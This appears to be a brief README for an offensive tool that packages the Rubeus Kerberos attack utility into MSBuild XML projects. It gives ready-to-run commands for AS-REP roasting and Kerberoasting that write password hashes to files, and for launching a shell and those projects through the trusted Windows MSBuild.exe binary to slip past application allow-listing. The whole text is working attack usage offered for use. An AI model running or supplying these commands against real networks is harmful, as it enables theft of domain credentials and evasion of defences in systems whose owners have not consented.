If needed, firstly Build the project once compiled the exe with .Net
# MSBUILD_files

* python GhostBuilder.py -e Rubeus_NET_4_7_2.exe -a '"asreproast", "/outfile:hashes-asp.txt"' -o FILENAME.xml
* python GhostBuilder.py -e Rubeus_NET_4_7_2.exe -a '"kerberoast", "/outfile:hashes-kerb.txt"' -o FILENAME.xml

# Run it FIRST to get a Shell prompt
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\path\to\MSBuildShell.csproj


# From within the prompt, Run the Project of choice. 
Template 
* C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\path\to\FILENAME.xml 

Use any of the prebuilt scripts or make you own. 

Example 
(x64) 
* C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe c:\Temp\Rubeus-asrep_net_4_7_2-args-outfile.xml 

(x86) 
* C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe c:\Temp\Rubeus-asrep_net_4_7_2-args-outfile.xml 

